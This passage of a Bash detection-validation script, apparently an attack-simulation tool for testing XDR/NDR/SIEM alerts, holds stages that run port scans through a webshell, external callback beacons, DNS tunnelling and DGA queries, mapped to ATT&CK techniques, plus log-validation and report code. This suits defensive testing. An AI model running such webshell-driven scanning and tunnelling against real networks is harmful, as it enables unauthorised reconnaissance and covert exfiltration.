        set_stage_result "Non-Standard Port Follow-up" "Success" "dry-run planned ${NONSTANDARD_PORT_CONNECTIONS}"
        save_nonstandard_port_overlap_result
        return 0
    fi
    ports="${fixed_ports[*]} ${ephemeral_ports[*]}"
    ports_cmd="${REMOTE_SHELL_HELPERS} c=0; campaign='${CAMPAIGN_ID}'; "
    while IFS= read -r host; do
        [[ -z "${host}" ]] && continue
        [[ "${host}" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || continue
        ip_in_target_net "${host}" || continue
        for wave in 1 2 3; do
            for port in ${ports}; do
                ports_cmd+="poc_port_probe '${host}' '${port}' && c=\$((c+1)) || true; "
            done
            ports_cmd+="sleep \$((1 + RANDOM % 2)); "
        done
        connections=$((connections + (${#fixed_ports[@]} + ${#ephemeral_ports[@]}) * 3))
    done <<< "${hosts}"
    ports_cmd+="echo NONSTANDARD_PORT_STATS connections=\$c campaign=\${campaign}"
    out=$(run_webshell_long "nonstandard-port-wave" "${ports_cmd}" 2>/dev/null || true)
    if [[ "${out}" == *"NONSTANDARD_PORT_STATS"* ]]; then
        NONSTANDARD_PORT_CONNECTIONS=$(safe_int "$(sed -n 's/.*connections=\([0-9][0-9]*\).*/\1/p' <<< "${out}")")
    fi
    (( NONSTANDARD_PORT_CONNECTIONS < 1 )) && NONSTANDARD_PORT_CONNECTIONS="${connections}"
    log_message "OK" "Non-Standard Port follow-up complete: connections=${NONSTANDARD_PORT_CONNECTIONS}"
    set_stage_result "Non-Standard Port Follow-up" "Success" "connections=${NONSTANDARD_PORT_CONNECTIONS}"
    write_report_entries "nonstandard_port" "T1046" "NDR" "Non-Standard Port Anomaly" "multi" "success" "wave port probes"
    save_nonstandard_port_overlap_result
}

stage_correlation_telemetry_bundle() {
    log_message "STAGE" "Correlation telemetry chain (callback → fanout → DNS → non-standard ports)"
    add_executed_stage "Correlation Telemetry Chain"
    if [[ "${CORRELATION_OVERLAP_LAUNCHED}" == true ]]; then
        if [[ "${CORRELATION_CALLBACK_DONE}" != true ]]; then
            stage_external_callback
            maybe_run_internal_web_fanout_fallback
        elif (( EXTERNAL_CALLBACK_CONNECTED == 0 && INTERNAL_FANOUT_ATTEMPTED == 0 )); then
            maybe_run_internal_web_fanout_fallback
        fi
        write_report_entries "correlation_chain" "TA0011" "XDR/NDR/SIEM" "Correlation Telemetry" "multi" "success" "overlap chain (DNS/ports concurrent with HTTP/SSH)"
        return 0
    fi
    if [[ "${PIPELINE_OVERLAP}" == true && "${DRY_RUN}" != true ]]; then
        CORRELATION_OVERLAP_LAUNCHED=true
        run_stage_concurrent "Enhanced DNS Tunnel" stage_dns_tunnel_enhanced
        if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
            run_stage_concurrent "DGA Simulation" followup_stage_dga
        fi
        run_stage_concurrent "Non-Standard Port Follow-up" stage_nonstandard_port_followup
        run_stage_concurrent "External Callback" stage_external_callback
        wait_all_humanize_workers
        maybe_run_internal_web_fanout_fallback
    else
        stage_external_callback
        maybe_run_internal_web_fanout_fallback
        stage_dns_tunnel_enhanced
        if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
            followup_stage_dga
        fi
        stage_nonstandard_port_followup
    fi
    write_report_entries "correlation_chain" "TA0011" "XDR/NDR/SIEM" "Correlation Telemetry" "multi" "success" "callback+dns+ports chain"
    emit_poc_customer_explanation
}

simulate_correlation_telemetry_dry_run() {
    [[ "${DRY_RUN}" != true ]] && return 0
    local fanout_targets fanout_n
    fanout_targets=$(collect_internal_fanout_targets)
    fanout_n=$(count_hosts_blob "${fanout_targets}")
    EXTERNAL_CALLBACK_ATTEMPTED="${BEACON_COUNT}"
    EXTERNAL_CALLBACK_CONNECTED="${BEACON_COUNT}"
    EXTERNAL_CALLBACK_RESPONSES="${BEACON_COUNT}"
    EXTERNAL_CALLBACK_STATUS="success"
    EXTERNAL_CALLBACK_FAILED=false
    INTERNAL_FANOUT_TARGETS="${fanout_n}"
    if (( fanout_n > 0 )); then
        INTERNAL_FANOUT_ATTEMPTED=$((fanout_n * INTERNAL_FANOUT_PER_TARGET))
        INTERNAL_FANOUT_CONNECTED="${INTERNAL_FANOUT_ATTEMPTED}"
        INTERNAL_FANOUT_RESPONSES="${INTERNAL_FANOUT_ATTEMPTED}"
        INTERNAL_FANOUT_STATUS="success"
    else
        INTERNAL_FANOUT_STATUS="skipped"
    fi
    DNS_QUERIES_PLANNED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_ENH_ATTEMPTED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_ENH_SUCCESS="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_ENH_RESULT="success"
    DNS_TUNNEL_ENH_REASON="dry_run_synthetic"
    DNS_TUNNEL_FB_ATTEMPTED=0
    DNS_TUNNEL_FB_RESULT="skipped"
    DNS_QUERIES_ATTEMPTED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_RESPONSES_RECEIVED="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_TUNNEL_FINAL_RESULT="success"
    DNS_TUNNEL_STAGE_STATUS="success"
    DNS_A_QUERIES=$((DNS_TUNNEL_QUERY_COUNT * 4 / 10))
    DNS_TXT_QUERIES=$((DNS_TUNNEL_QUERY_COUNT * 3 / 10))
    DNS_AAAA_QUERIES=$((DNS_TUNNEL_QUERY_COUNT * 2 / 10))
    DNS_HTTPS_QUERY_COUNT=$((DNS_TUNNEL_QUERY_COUNT / 10))
    DNS_EFFECTIVE_TLD_COUNT="${DNS_TUNNEL_QUERY_COUNT}"
    DNS_CLUSTER_LOCAL_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 35 / 100))
    DNS_POWERAPPS_STYLE_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 25 / 100))
    DNS_SUSPICIOUS_TLD_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 20 / 100))
    DNS_TOTAL_ENTROPY_STYLE_COUNT=$((DNS_TUNNEL_QUERY_COUNT * 30 / 100))
    DNS_HIGH_ENTROPY_LABELS="${DNS_TOTAL_ENTROPY_STYLE_COUNT}"
    DNS_TLD_CC_COUNT="${DNS_SUSPICIOUS_TLD_COUNT}"
    DNS_TLD_TO_COUNT=0
    DNS_TLD_TOP_COUNT=0
    DNS_TLD_XYZ_COUNT=0
    DNS_NXDOMAIN_STYLE=0
    NONSTANDARD_PORT_CONNECTIONS=$((fanout_n * 52 + 20))
    CORRELATION_BEACON_CYCLES=$((BEACON_COUNT / 3 + 1))
    FANOUT_UA_JNDI_STYLE_COUNT=$((INTERNAL_FANOUT_ATTEMPTED / 5))
    FANOUT_UA_OGNL_STYLE_COUNT=$((INTERNAL_FANOUT_ATTEMPTED / 12))
    FANOUT_UA_SPRING_STYLE_COUNT=$((INTERNAL_FANOUT_ATTEMPTED / 12))
    if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
        run_dga_simulation || true
    fi
}

format_correlation_telemetry_summary_block() {
    EXTERNAL_CALLBACK_STATUS=$(external_callback_stage_status)
    INTERNAL_FANOUT_STATUS=$(internal_fanout_stage_status)
    cat <<EOF
External Callback
- attempted                 : ${EXTERNAL_CALLBACK_ATTEMPTED:-0}
- connected                 : ${EXTERNAL_CALLBACK_CONNECTED:-0}
- responses                 : ${EXTERNAL_CALLBACK_RESPONSES:-0}
- status                    : ${EXTERNAL_CALLBACK_STATUS}

Internal Web Fanout
- targets                   : ${INTERNAL_FANOUT_TARGETS:-0}
- attempted                 : ${INTERNAL_FANOUT_ATTEMPTED:-0}
- connected                 : ${INTERNAL_FANOUT_CONNECTED:-0}
- responses                 : ${INTERNAL_FANOUT_RESPONSES:-0}
- status                    : ${INTERNAL_FANOUT_STATUS}

DNS Tunnel
- planned                   : ${DNS_QUERIES_PLANNED:-0}
- attempted                 : ${DNS_QUERIES_ATTEMPTED:-0}
- responses                 : ${DNS_RESPONSES_RECEIVED:-0}
- target resolver           : ${DNS_TARGET_SERVER:-n/a} (source=${DNS_TARGET_SELECTION_SOURCE:-unknown})
- fallback resolver used    : ${DNS_TUNNEL_FALLBACK_RESOLVER:-false}
- simulation mode           : ${DNS_TUNNEL_MODE_USED:-${DNS_TUNNEL_MODE:-auto}}
- query tool                : ${DNS_TUNNEL_QUERY_TOOL:-n/a}
- A / TXT queries           : ${DNS_A_QUERIES:-0} / ${DNS_TXT_QUERIES:-0}
- NXDOMAIN / timeout        : ${DNS_TUNNEL_NXDOMAIN_COUNT:-0} / ${DNS_TUNNEL_TIMEOUT_COUNT:-0}
- avg / max FQDN length     : $(( DNS_TUNNEL_FQDN_COUNT > 0 ? DNS_TUNNEL_FQDN_LEN_SUM / DNS_TUNNEL_FQDN_COUNT : 0 )) / ${DNS_TUNNEL_FQDN_LEN_MAX:-0}
- entropy indicator         : ${DNS_TUNNEL_APPROX_ENTROPY:-0}
- effective_tld count       : ${DNS_EFFECTIVE_TLD_COUNT:-0}
- suspicious_tld count      : ${DNS_SUSPICIOUS_TLD_COUNT:-0}
- cluster.local count       : ${DNS_CLUSTER_LOCAL_COUNT:-0}
- powerapps-style count     : ${DNS_POWERAPPS_STYLE_COUNT:-0}
- HTTPS query count         : ${DNS_HTTPS_QUERY_COUNT:-0}
- skip reason               : ${DNS_TUNNEL_SKIP_REASON:-none}
- stage status              : ${DNS_TUNNEL_STAGE_STATUS:-skipped}
- expected detection        : DNS Tunneling Anomaly (dns_tunnel / T1048)

DGA Simulation
- enabled                   : ${DGA_SIMULATION_ENABLED}
- base domain               : ${DGA_BASE_DOMAIN:-xdr.ooo}
- nx_sent / nx_nxdomain     : ${DGA_MODEL_NX_COUNT:-500} / ${DGA_NXDOMAIN_COUNT:-0}
- resolvable_sent / resolved: ${DGA_MODEL_RESOLVABLE_COUNT:-30} / ${DGA_RESOLVED_COUNT:-0}
- timeout / error           : ${DGA_TIMEOUT_COUNT:-0} / ${DGA_ERROR_COUNT:-0}
- stage status              : ${DGA_STAGE_STATUS:-skipped}
- skip reason               : ${DGA_SKIP_REASON:-none}
- expected detection        : DGA Model Traffic (NXDOMAIN + resolvable same base domain)


Non-Standard Port Follow-up
- connections               : ${NONSTANDARD_PORT_CONNECTIONS:-0}
- beacon cycles (external)  : ${CORRELATION_BEACON_CYCLES:-0}
EOF
}

poc_live_log_stage_line_from_state() {
    local stage_label="$1" state_file="${LOCAL_STATE_DIR}/stage_results.log"
    local line="" status="" reason=""
    [[ -f "${state_file}" ]] || return 1
    line=$(grep -F "${stage_label}:" "${state_file}" 2>/dev/null | tail -n1 || true)
    [[ -z "${line}" ]] && return 1
    status=${line#${stage_label}: }
    status=${status%% |*}
    reason=""
    [[ "${line}" == *"| Reason: "* ]] && reason=${line#*| Reason: }
    printf 'Stage result: %s = %s%s\n' "${stage_label}" "${status}" "${reason:+ — ${reason}}"
}

poc_collect_dns_tunnel_live_log() {
    local out="${LOG_DIR}/live_validation_dns_tunnel.log" stage_line=""
    mkdir -p "${LOG_DIR}" 2>/dev/null || true
    {
        [[ -n "${LOG_FILE:-}" && -f "${LOG_FILE}" ]] && grep -E 'DNS Tunnel:|DNS_PAYLOAD_TRANSPORT|DNS_TUNNEL_|DNS_STAGE_FINAL|Stage result: DNS Tunnel|ROOT_CAUSE_ANALYSIS module=DNS' "${LOG_FILE}" 2>/dev/null || true
        [[ -f "${LOG_DIR}/dns_tunnel_waves.log" ]] && cat "${LOG_DIR}/dns_tunnel_waves.log"
        [[ -f "${LOCAL_STATE_DIR}/dns_tunnel_simulation.log" ]] && cat "${LOCAL_STATE_DIR}/dns_tunnel_simulation.log"
        [[ -f "${LOCAL_STATE_DIR}/dns_tunnel_final_summary.log" ]] && cat "${LOCAL_STATE_DIR}/dns_tunnel_final_summary.log"
        [[ -f "${LOCAL_STATE_DIR}/dns_tunnel_statistics.log" ]] && cat "${LOCAL_STATE_DIR}/dns_tunnel_statistics.log"
        stage_line=$(poc_live_log_stage_line_from_state "DNS Tunnel" 2>/dev/null || true)
        [[ -n "${stage_line}" ]] && printf '%s\n' "${stage_line}"
    } > "${out}"
    printf '%s' "${out}"
}

poc_collect_dga_live_log() {
    local out="${LOG_DIR}/live_validation_dga_simulation.log" stage_line=""
    mkdir -p "${LOG_DIR}" 2>/dev/null || true
    {
        [[ -n "${LOG_FILE:-}" && -f "${LOG_FILE}" ]] && grep -E 'DGA_|Stage result: DGA Simulation|ROOT_CAUSE_ANALYSIS module=DGA' "${LOG_FILE}" 2>/dev/null || true
        [[ -f "${LOG_DIR}/dga_simulation.log" ]] && cat "${LOG_DIR}/dga_simulation.log"
        [[ -f "${LOCAL_STATE_DIR}/dga_simulation.log" ]] && cat "${LOCAL_STATE_DIR}/dga_simulation.log"
        stage_line=$(poc_live_log_stage_line_from_state "DGA Simulation" 2>/dev/null || true)
        [[ -n "${stage_line}" ]] && printf '%s\n' "${stage_line}"
    } > "${out}"
    printf '%s' "${out}"
}

poc_emit_live_log_validation_detail() {
    local module="$1" planned="$2" attempted="$3" actual="$4" received="$5"
    local likelihood="$6" result="$7" validation="$8" reason="$9"
    local msg="LIVE_LOG_VALIDATION_DETAIL module=${module} planned=${planned} attempted=${attempted} actual=${actual} received=${received} likelihood=${likelihood} result=${result} validation=${validation} reason=${reason}"
    printf '%s\n' "${msg}"
    log_message "OK" "${msg}"
    state_append "live_log_validation.log" "${msg}"
}

poc_emit_live_log_validation() {
    local module="$1" result="$2" detail="$3"
    LIVE_LOG_VALIDATION="${result}"
    case "${module}" in
        dns_tunnel) DNS_LIVE_LOG_VALIDATION="${result}" ;;
        dga_simulation) DGA_LIVE_LOG_VALIDATION="${result}" ;;
        dns_new_tld) DNS_NEW_TLD_LIVE_LOG_VALIDATION="${result}" ;;
    esac
    printf 'LIVE_LOG_VALIDATION=%s\n' "${result}"
    if [[ "${result}" == failed && -n "${detail}" ]]; then
        printf 'LIVE_LOG_VALIDATION reason=%s\n' "${detail}"
    fi
    log_message "OK" "LIVE_LOG_VALIDATION=${result} module=${module} detail=${detail}"
    state_append "live_log_validation.log" "module=${module} result=${result} detail=${detail}"
}

poc_run_dns_tunnel_live_log_validation() {
    local log_path="" err="" report_status="skipped"
    [[ "${DRY_RUN}" == true ]] && {
        poc_emit_live_log_validation "dns_tunnel" "skipped" "dry_run"
        write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "skipped" "dry_run"
        return 0
    }
    if [[ "${DNS_TUNNEL_STAGE_STATUS}" == skipped ]]; then
        poc_emit_live_log_validation "dns_tunnel" "skipped" "${DNS_TUNNEL_SKIP_REASON:-stage_skipped}"
        write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "skipped" "${DNS_TUNNEL_SKIP_REASON:-stage_skipped}"
        return 0
    fi
    log_path=$(poc_collect_dns_tunnel_live_log)
    if poc_validate_dns_tunnel_live_log "${log_path}" err; then
        poc_emit_live_log_validation "dns_tunnel" "passed" "${err}"
        report_status="success"
        write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "${report_status}" "${err}"
        return 0
    fi
    poc_emit_live_log_validation "dns_tunnel" "failed" "${err}"
    write_report_entries "dns_tunnel_live_log" "T1071.004" "NDR/SIEM" "DNS Live Log Validation" "${TARGET_NET}" "failed" "${err}"
    return 1
}

poc_run_dga_live_log_validation() {
    local log_path="" err="" report_status="skipped"
    [[ "${DRY_RUN}" == true ]] && {
        poc_emit_live_log_validation "dga_simulation" "skipped" "dry_run"
        write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "skipped" "dry_run"
        return 0
    }
    if [[ "${DGA_STAGE_STATUS}" == Skipped || "${DGA_SIMULATION_ENABLED}" != true ]]; then
        poc_emit_live_log_validation "dga_simulation" "skipped" "${DGA_SKIP_REASON:-disabled}"
        write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "skipped" "${DGA_SKIP_REASON:-disabled}"
        return 0
    fi
    log_path=$(poc_collect_dga_live_log)
    if poc_validate_dga_live_log "${log_path}" err; then
        poc_emit_live_log_validation "dga_simulation" "passed" "${err}"
        report_status="success"
        write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "${report_status}" "${err}"
        return 0
    fi
    poc_emit_live_log_validation "dga_simulation" "failed" "${err}"
    write_report_entries "dga_live_log" "T1568.002" "NDR/SIEM" "DGA Live Log Validation" "${TARGET_NET}" "failed" "${err}"
    return 1
}

poc_collect_dns_new_tld_live_log() {
    local line="" stage_line=""
    line=$(read_state_file_or_none "dns_new_tld_test.log" | grep -E '^DNS_NEW_TLD_' | tail -n200 || true)
    if [[ -z "${line}" && -n "${LOG_DIR}" && -f "${LOG_DIR}/dns_new_tld_test.log" ]]; then
        line=$(grep -E '^DNS_NEW_TLD_' "${LOG_DIR}/dns_new_tld_test.log" 2>/dev/null | tail -n200 || true)
    fi
    stage_line=$(poc_live_log_stage_line_from_state "DNS New TLD Test" 2>/dev/null || true)
    printf '%s\n%s\n' "${line}" "${stage_line}"
}

poc_run_dns_new_tld_live_log_validation() {
    local log_path="" err="" report_status="skipped"
    [[ "${DRY_RUN}" == true ]] && {
        poc_emit_live_log_validation "dns_new_tld" "skipped" "dry_run"
        write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "skipped" "dry_run"
        return 0
    }
    if [[ "${DNS_NEW_TLD_STAGE_STATUS}" == Skipped || "${DNS_NEW_TLD_ENABLED}" != true ]]; then
        poc_emit_live_log_validation "dns_new_tld" "skipped" "${DNS_NEW_TLD_SKIP_REASON:-disabled}"
        write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "skipped" "${DNS_NEW_TLD_SKIP_REASON:-disabled}"
        return 0
    fi
    log_path=$(poc_collect_dns_new_tld_live_log)
    if poc_validate_dns_new_tld_live_log "${log_path}" err; then
        poc_emit_live_log_validation "dns_new_tld" "passed" "${err}"
        report_status="success"
        write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "${report_status}" "${err}"
        return 0
    fi
    poc_emit_live_log_validation "dns_new_tld" "failed" "${err}"
    write_report_entries "dns_new_tld_live_log" "T1071" "NDR/SIEM" "DNS New TLD Live Log Validation" "${TARGET_NET}" "failed" "${err}"
    return 1
}

poc_live_log_read_content() {
    local log_input="$1"
    if [[ -f "${log_input}" ]]; then
        cat "${log_input}"
    else
        printf '%s' "${log_input}"
    fi
}

poc_live_log_last_match() {
    local content="$1" pattern="$2"
    printf '%s\n' "${content}" | grep -E "${pattern}" | tail -n1 || true
}

poc_live_log_stage_status() {
    local stage_line="$1"
    case "${stage_line}" in
        *"= Success"*) printf 'Success' ;;
        *"= Partial"*) printf 'Partial' ;;
        *"= Failed"*) printf 'Failed' ;;
        *"= Skipped"*) printf 'Skipped' ;;
        *"= Fallback"*) printf 'Fallback' ;;
        *) printf 'unknown' ;;
    esac
}

poc_live_log_assert_no_success_on_zero_dns() {
    local attempted="$1" unique="$2" final_result="$3" stage_status="$4" entropy="${5:-0}" likelihood="${6:-LOW}" actual="${7:-0}"
    actual=$(safe_int "${actual}")
    if (( actual > 0 )); then
        attempted="${actual}"
    fi
    if (( attempted == 0 || unique == 0 )); then
        [[ "${final_result}" == success ]] && return 1
        [[ "${stage_status}" == Success ]] && return 1
    fi
    if [[ "${final_result}" == success || "${stage_status}" == Success ]]; then
        if (( entropy == 0 )); then
            return 1
        fi
        if [[ "${likelihood}" == LOW ]]; then
            return 1
        fi
    fi
    return 0
}


poc_live_log_assert_no_success_on_zero_dga() {
    local queries="$1" nxdomain="$2" stage_status="$3" final_result="${4:-failed}" resolved="${5:-0}" actual_queries="${6:-0}" actual_nx="${7:-0}"
    actual_queries=$(safe_int "${actual_queries}")
    actual_nx=$(safe_int "${actual_nx}")
    if (( actual_queries > 0 )); then
        queries="${actual_queries}"
    fi
    if (( actual_nx > 0 )); then
        nxdomain="${actual_nx}"
    fi
    if (( queries == 0 || nxdomain == 0 )); then
        [[ "${stage_status}" == Success ]] && return 1
        [[ "${final_result}" == success ]] && return 1
    fi
    if [[ "${final_result}" == success || "${stage_status}" == Success ]]; then
        if (( nxdomain < 150 || resolved < 3 )); then
            return 1
        fi
    fi
    return 0
}

poc_validate_dns_tunnel_live_log() {
    local log_input="$1" err_out="${2:-POC_LIVE_LOG_VALIDATE_ERR}" content="" errors=""
    local transport="" sim_stats="" statistics="" final_summary="" stage_line=""
    local attempted=0 unique=0 planned=0 nx=0 payload_bytes=0 method="" final_result="" stage_status=""
    local sim_attempted=0 stat_queries=0 stat_unique=0 sim_planned=0 entropy=0 likelihood=""
    local actual_dns=0 query_generated=0 query_sent=0 query_responded=0

    content=$(poc_live_log_read_content "${log_input}")
    transport=$(poc_live_log_last_match "${content}" 'DNS_PAYLOAD_TRANSPORT')
    sim_stats=$(poc_live_log_last_match "${content}" 'DNS_TUNNEL_SIM_STATS')
    statistics=$(poc_live_log_last_match "${content}" 'DNS_TUNNEL_STATISTICS')
    final_summary=$(poc_live_log_last_match "${content}" 'DNS_TUNNEL_FINAL_SUMMARY')
    stage_line=$(poc_live_log_last_match "${content}" 'Stage result: DNS Tunnel')

    [[ -z "${transport}" ]] && errors+="missing DNS_PAYLOAD_TRANSPORT; "
    [[ -z "${sim_stats}" && -z "${statistics}" ]] && errors+="missing DNS_TUNNEL_SIM_STATS and DNS_TUNNEL_STATISTICS; "
    [[ -z "${final_summary}" ]] && errors+="missing DNS_TUNNEL_FINAL_SUMMARY; "

    if [[ -n "${final_summary}" ]]; then
        for key in planned attempted unique_queries nxdomain payload_bytes webshell_method result entropy_score detection_likelihood query_generated query_sent query_responded actual_dns_queries actual_txt_queries actual_nxdomain; do
            [[ "${final_summary}" != *"${key}="* ]] && errors+="DNS_TUNNEL_FINAL_SUMMARY missing ${key}; "
        done
        attempted=$(safe_int "$(dns_stats_field_from_line "${final_summary}" attempted)")
        unique=$(safe_int "$(dns_stats_field_from_line "${final_summary}" unique_queries)")
        planned=$(safe_int "$(dns_stats_field_from_line "${final_summary}" planned)")
        nx=$(safe_int "$(dns_stats_field_from_line "${final_summary}" nxdomain)")
        actual_dns=$(safe_int "$(dns_stats_field_from_line "${final_summary}" actual_dns_queries)")
        query_generated=$(safe_int "$(dns_stats_field_from_line "${final_summary}" query_generated)")
        query_sent=$(safe_int "$(dns_stats_field_from_line "${final_summary}" query_sent)")
        query_responded=$(safe_int "$(dns_stats_field_from_line "${final_summary}" query_responded)")
        payload_bytes=$(safe_int "$(dns_stats_field_from_line "${final_summary}" payload_bytes)")
        method=$(dns_stats_field_from_line "${final_summary}" webshell_method)
        final_result=$(dns_stats_field_from_line "${final_summary}" result)
        entropy=$(safe_int "$(dns_stats_field_from_line "${final_summary}" entropy_score)")
        likelihood=$(dns_stats_field_from_line "${final_summary}" detection_likelihood)
    fi

    if [[ -n "${sim_stats}" ]]; then
        sim_attempted=$(safe_int "$(dns_stats_field_from_line "${sim_stats}" attempted)")
        sim_planned=$(safe_int "$(dns_stats_field_from_line "${sim_stats}" planned)")
        (( sim_planned > 0 && sim_planned <= 20 )) || errors+="DNS_TUNNEL_SIM_STATS planned=${sim_planned} not chunk-sized; "
        if [[ -n "${final_summary}" ]] && (( sim_attempted != attempted )); then
            errors+="sim_stats.attempted(${sim_attempted}) != final.attempted(${attempted}); "
        fi
    fi

    if [[ -n "${statistics}" ]]; then
        stat_queries=$(safe_int "$(dns_stats_field_from_line "${statistics}" queries)")
        stat_unique=$(safe_int "$(dns_stats_field_from_line "${statistics}" unique_queries)")
        if [[ -n "${sim_stats}" ]] && (( sim_attempted != stat_queries )); then
            errors+="sim_stats.attempted(${sim_attempted}) != statistics.queries(${stat_queries}); "
        fi
        if [[ -n "${final_summary}" ]] && (( stat_unique != unique )); then
            errors+="statistics.unique_queries(${stat_unique}) != final.unique_queries(${unique}); "
        fi
    fi

    if [[ -n "${transport}" ]]; then
        [[ "${transport}" != *payload_bytes=* ]] && errors+="DNS_PAYLOAD_TRANSPORT missing payload_bytes; "
        [[ "${transport}" != *webshell_method=* ]] && errors+="DNS_PAYLOAD_TRANSPORT missing webshell_method; "
    fi

    stage_status=$(poc_live_log_stage_status "${stage_line}")
    if ! poc_live_log_assert_no_success_on_zero_dns "${attempted}" "${unique}" "${final_result}" "${stage_status}" "${entropy}" "${likelihood}" "${actual_dns}"; then
        errors+="Success/final_result=success with attempted=${attempted} actual_dns=${actual_dns} unique=${unique} entropy=${entropy} likelihood=${likelihood}; "
    fi
    if [[ -n "${final_summary}" ]] && (( query_responded > 0 && attempted > 0 && query_responded != attempted )); then
        errors+="query_responded(${query_responded}) != attempted(${attempted}); "
    fi

    if [[ -n "${errors}" ]]; then
        printf -v "${err_out}" '%s' "${errors}"
        return 1
    fi
    printf -v "${err_out}" '%s' "ok planned=${planned} attempted=${attempted} unique=${unique} nx=${nx} payload_bytes=${payload_bytes} transport=${method:-GET} result=${final_result} stage=${stage_status}"
    return 0
}

poc_validate_dga_live_log() {
    local log_input="$1" err_out="${2:-POC_LIVE_LOG_VALIDATE_ERR}" content="" errors=""
    local transport="" nx_chunk="" chunk_summary="" stage_summary="" stage_line="" stage_final=""
    local queries=0 nxdomain=0 resolved=0 payload_bytes=0 method="" stage_status="" final_result=""
    local actual_dns=0 actual_nx=0 query_generated=0 query_sent=0 query_responded=0

    content=$(poc_live_log_read_content "${log_input}")
    transport=$(poc_live_log_last_match "${content}" 'DGA_PAYLOAD_TRANSPORT')
    nx_chunk=$(poc_live_log_last_match "${content}" 'DGA_NX_CHUNK_SUMMARY')
    chunk_summary=$(poc_live_log_last_match "${content}" 'DGA_CHUNK_SUMMARY')
    stage_summary=$(poc_live_log_last_match "${content}" 'DGA_STAGE_FINAL_SUMMARY')
    stage_line=$(poc_live_log_last_match "${content}" 'Stage result: DGA Simulation')

    [[ -z "${transport}" ]] && errors+="missing DGA_PAYLOAD_TRANSPORT; "
    [[ -z "${nx_chunk}" && -z "${chunk_summary}" ]] && errors+="missing DGA_NX_CHUNK_SUMMARY and DGA_CHUNK_SUMMARY; "
    [[ -z "${stage_summary}" ]] && errors+="missing DGA_STAGE_FINAL_SUMMARY; "

    if [[ -n "${stage_summary}" ]]; then
        for key in planned queries nxdomain payload_bytes webshell_method result query_generated query_sent query_responded actual_dns_queries actual_random_domains actual_nxdomain; do
            [[ "${stage_summary}" != *"${key}="* ]] && errors+="DGA_STAGE_FINAL_SUMMARY missing ${key}; "
        done
        queries=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" queries)")
        nxdomain=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" nxdomain)")
        resolved=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" resolved)")
        actual_dns=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" actual_dns_queries)")
        actual_nx=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" actual_nxdomain)")
        query_generated=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" query_generated)")
        query_sent=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" query_sent)")
        query_responded=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" query_responded)")
        payload_bytes=$(safe_int "$(dns_stats_field_from_line "${stage_summary}" payload_bytes)")
        method=$(dns_stats_field_from_line "${stage_summary}" webshell_method)
        final_result=$(dns_stats_field_from_line "${stage_summary}" result)
    fi

    if [[ -n "${nx_chunk}" ]]; then
        local nx_q nx_nx
        nx_q=$(safe_int "$(dns_stats_field_from_line "${nx_chunk}" queries)")
        nx_nx=$(safe_int "$(dns_stats_field_from_line "${nx_chunk}" nxdomain)")
        if (( nx_q > 0 )); then
            (( nx_q <= 20 )) || errors+="DGA_NX_CHUNK_SUMMARY queries=${nx_q} not chunk-sized; "
        fi
    fi

    if [[ -n "${chunk_summary}" ]]; then
        local cs_q cs_nx
        cs_q=$(safe_int "$(dns_stats_field_from_line "${chunk_summary}" queries)")
        cs_nx=$(safe_int "$(dns_stats_field_from_line "${chunk_summary}" nxdomain)")
        if [[ -n "${stage_summary}" ]] && (( queries > 0 && cs_q > queries )); then
            errors+="chunk_summary queries(${cs_q}) exceeds stage queries(${queries}); "
        fi
        if [[ -n "${stage_summary}" ]] && (( nxdomain > 0 && cs_nx > nxdomain )); then
            errors+="chunk_summary nx(${cs_nx}) exceeds stage nx(${nxdomain}); "
        fi
    fi

    if [[ -n "${transport}" ]]; then
        [[ "${transport}" != *payload_bytes=* ]] && errors+="DGA_PAYLOAD_TRANSPORT missing payload_bytes; "
        [[ "${transport}" != *webshell_method=* ]] && errors+="DGA_PAYLOAD_TRANSPORT missing webshell_method; "
    fi

    stage_status=$(poc_live_log_stage_status "${stage_line}")
    if ! poc_live_log_assert_no_success_on_zero_dga "${queries}" "${nxdomain}" "${stage_status}" "${final_result}" "${resolved}" "${actual_dns}" "${actual_nx}"; then
        errors+="Success/result=success with queries=${queries} actual_dns=${actual_dns} nxdomain=${nxdomain} actual_nx=${actual_nx} resolved=${resolved}; "
    fi
    local dw_summary dw_met="" dw_nx=0
    dw_summary=$(poc_live_log_last_match "${content}" 'DETECTION_WINDOW_SUMMARY module=DGA_Simulation')
    if [[ -n "${dw_summary}" ]]; then
        dw_met=$(dns_stats_field_from_line "${dw_summary}" condition_met)
        if [[ "${dw_met}" == yes && "${stage_status}" != Success ]]; then
            errors+="DETECTION_WINDOW condition_met=yes but stage=${stage_status}; "
        fi
